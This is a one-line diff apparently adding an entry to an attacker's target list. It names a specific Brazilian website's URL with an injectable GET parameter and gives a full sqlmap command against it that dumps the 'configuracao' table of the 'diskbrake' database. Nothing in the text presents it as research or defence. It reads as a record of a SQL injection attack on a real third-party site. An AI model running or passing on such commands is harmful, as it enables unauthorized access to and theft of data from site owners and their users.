@@ -1,0 +1,1 @@
+http://www.diskbrake.com.br/sessao.php?get_id=231 (GET)  # sqlmap.py --threads 5 -v3 --random-agent -u http://www.diskbrake.com.br/sessao.php?get_id=231 -D diskbrake -T configuracao --dump
